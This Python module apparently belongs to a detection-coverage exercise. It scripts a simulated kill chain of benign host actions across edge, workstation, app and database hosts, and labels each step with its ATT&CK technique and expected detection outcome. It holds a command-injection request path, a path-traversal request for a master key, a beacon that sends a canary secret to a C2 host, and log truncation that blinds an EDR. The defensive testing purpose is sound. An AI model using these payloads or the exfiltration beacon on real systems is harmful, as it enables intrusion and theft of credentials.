"""Attack scenarios, assembled into one kill chain across the fleet.

Each step performs a real, benign host action and declares its ground truth:
the ATT&CK technique, the OWASP:2025 category, and the lecture it comes from.
The steps are ordered so the three outcomes all appear in one run:

- DETECTED: a rule fires (initial access, credential read, lateral shell).
- VISIBLE_ONLY: a sensor records it but no rule matches (recon). The gap the
  proposal feedback asks us to show.
- BLIND: no sensor records it — once because the host's sensors don't cover
  network (H1, the app-tier egress), once because the EDR was just blinded
  (H2, the egress after log tampering).
"""

from __future__ import annotations

import os
from collections.abc import Callable
from dataclasses import dataclass
from typing import TYPE_CHECKING

from . import host
from .agent import Agent
from .events import EventKind, Observation, Technique
from .workspace import Workspace

if TYPE_CHECKING:
    from .fleet import Fleet

Campaign = list[tuple[Agent, "AttackStep"]]


@dataclass
class StepContext:
    workspace: Workspace
    c2_host: str
    c2_port: int


@dataclass
class AttackStep:
    id: str
    tactic: str
    name: str
    technique: Technique
    effect_kind: EventKind
    owasp: str
    course: str
    narrative: str
    perform: Callable[[Agent, StepContext], None]


def _log_request(agent: Agent, path: str) -> None:
    """Emit the normal-looking request the app itself logs. Only an applog
    sensor records it, and it never carries the host effect — that is H3: the
    application log has entries, just not the ones that matter."""
    agent.node.observe(
        Observation(
            kind=EventKind.APP_REQUEST,
            actor=agent.workload,
            target=path,
            detail={"status": "200"},
        )
    )


def _shell_inner() -> str:
    return "whoami" if os.name == "nt" else "id"


def _exec_shell(agent: Agent, _ctx: StepContext) -> None:
    _log_request(agent, "/api/report?format=pdf;id")
    agent.node.observe(host.spawn(host.shell_command(_shell_inner()), actor=agent.workload))


def _read_secret(agent: Agent, ctx: StepContext) -> None:
    _log_request(agent, "/api/statements?name=../secrets/master.key")
    agent.node.observe(host.read_file(ctx.workspace.canary_secret_file, actor=agent.workload))


def _recon(agent: Agent, _ctx: StepContext) -> None:
    _log_request(agent, "/api/health")
    # A non-shell discovery binary: visible as a process spawn, matched by no
    # rule. This is the VISIBLE_ONLY case.
    agent.node.observe(host.spawn(["hostname"], actor=agent.workload))


def _lateral_shell(agent: Agent, _ctx: StepContext) -> None:
    agent.node.observe(host.spawn(host.shell_command(_shell_inner()), actor=agent.workload))


def _beacon(agent: Agent, ctx: StepContext) -> None:
    payload = b"exfil:" + ctx.workspace.canary_secret_file.read_bytes()
    agent.node.observe(host.connect(ctx.c2_host, ctx.c2_port, payload, actor=agent.workload))


def _tamper_then_blind(agent: Agent, ctx: StepContext) -> None:
    # The EDR catches its own disabling in the instant before it goes dark, then
    # stops recording while its status check keeps saying "healthy" (H2).
    agent.node.observe(host.truncate_log(ctx.workspace.log_for(agent.id), actor=agent.workload))
    if "edr" in agent.role.sensors:
        agent.node.sensor("edr").blind()


def build_killchain(fleet: "Fleet", ctx: StepContext) -> Campaign:
    """Order the steps into the Uber-shaped story from Day 6: web foothold ->
    stolen credentials -> recon -> a parallel phished workstation -> pivot
    inward -> reach the crown jewels -> disable logging -> exfiltrate.

    The ordering is chosen so every outcome, and both halves of H1, appear in a
    single run *as scored steps*, not only in the static coverage matrix:

    - Exfiltration (T1041) is DETECTED on the EDR-covered edge host (s3) and
      BLIND on the auditd-only app host (s7) and on the EDR-blinded db (s12).
    - A credential read (T1552.001) is DETECTED on the EDR/auditd hosts (s2,
      s10) but BLIND on the osquery-only workstation (s6), which sees processes
      but not file reads. That contrast is H1, live.
    """
    edge = fleet.first("edge-web")
    ws = fleet.first("workstation")
    app = fleet.first("app")
    db = fleet.first("db")
    steps = [
        (edge, AttackStep(
            "s1", "Initial Access", "command injection on the web tier",
            Technique("T1059", "Command and Scripting Interpreter"),
            EventKind.PROCESS_SPAWN, "A05 Injection", "Day 8/15",
            "An injection flaw lets the web workload spawn a shell.",
            _exec_shell)),
        (edge, AttackStep(
            "s2", "Credential Access", "read credentials from the host",
            Technique("T1552.001", "Unsecured Credentials: Credentials In Files"),
            EventKind.FILE_READ, "A04 Cryptographic Failures", "Day 6/12",
            "Credentials sit in a file, weakly protected; the shell reads them. "
            "The edge host runs an EDR, so the read raises an alarm.",
            _read_secret)),
        (edge, AttackStep(
            "s3", "Exfiltration", "beacon stolen creds out from the edge",
            Technique("T1041", "Exfiltration Over C2 Channel"),
            EventKind.NETWORK_CONNECT, "A01 Broken Access Control (SSRF)", "Day 3",
            "The edge host beacons to C2. Its EDR covers the network, so the "
            "egress rule fires — the DETECTED half of the H1 egress contrast.",
            _beacon)),
        (edge, AttackStep(
            "s4", "Discovery", "network recon with a living-off-the-land binary",
            Technique("T1057", "Process Discovery"),
            EventKind.PROCESS_SPAWN, "A09 Logging & Alerting Failures", "Day 2/15",
            "A benign recon binary runs: a trace in the logs, but no rule for it "
            "— visible, no alarm.",
            _recon)),
        (ws, AttackStep(
            "s5", "Initial Access", "phished employee runs a macro shell",
            Technique("T1059", "Command and Scripting Interpreter"),
            EventKind.PROCESS_SPAWN, "A05 Injection", "Day 6/15",
            "A phished workstation spawns a shell. osquery's coarse telemetry "
            "still catches a process, so this one is DETECTED.",
            _exec_shell)),
        (ws, AttackStep(
            "s6", "Credential Access", "read cached credentials on the laptop",
            Technique("T1552.001", "Unsecured Credentials: Credentials In Files"),
            EventKind.FILE_READ, "A04 Cryptographic Failures", "Day 12",
            "The same credential read that the EDR hosts detect is BLIND here: "
            "osquery sees processes, not file reads (H1).",
            _read_secret)),
        (app, AttackStep(
            "s7", "Lateral Movement", "pivot to an app server with stolen creds",
            Technique("T1021", "Remote Services"),
            EventKind.PROCESS_SPAWN, "A07 Authentication Failures", "Day 6",
            "The stolen credentials open a shell on an internal app server.",
            _lateral_shell)),
        (app, AttackStep(
            "s8", "Exfiltration", "beacon out from the app tier",
            Technique("T1041", "Exfiltration Over C2 Channel"),
            EventKind.NETWORK_CONNECT, "A01 Broken Access Control (SSRF)", "Day 3",
            "The app server beacons to C2 — but its sensors do not cover the "
            "network, so nothing sees it. The BLIND half of the H1 contrast.",
            _beacon)),
        (db, AttackStep(
            "s9", "Lateral Movement", "reach the database",
            Technique("T1021", "Remote Services"),
            EventKind.PROCESS_SPAWN, "A01 Broken Access Control", "Day 2",
            "A shell opens on the database host.",
            _lateral_shell)),
        (db, AttackStep(
            "s10", "Collection", "read the master key",
            Technique("T1552.001", "Unsecured Credentials: Credentials In Files"),
            EventKind.FILE_READ, "A04 Cryptographic Failures", "Day 11/12",
            "The database's master key — the canary secret — is read.",
            _read_secret)),
        (db, AttackStep(
            "s11", "Defense Evasion", "disable logging on the database",
            Technique("T1685.004", "Disable or Modify Tools: Logging"),
            EventKind.LOG_TAMPER, "A09 Logging & Alerting Failures", "Day 15",
            "Logs are cleared and the EDR is blinded; its status still says healthy.",
            _tamper_then_blind)),
        (db, AttackStep(
            "s12", "Exfiltration", "exfiltrate after blinding the EDR",
            Technique("T1041", "Exfiltration Over C2 Channel"),
            EventKind.NETWORK_CONNECT, "A09 Logging & Alerting Failures", "Day 15",
            "The same beacon as before, now invisible because the EDR was just "
            "disabled (H2) — only the canary notices the silence.",
            _beacon)),
    ]
    return steps
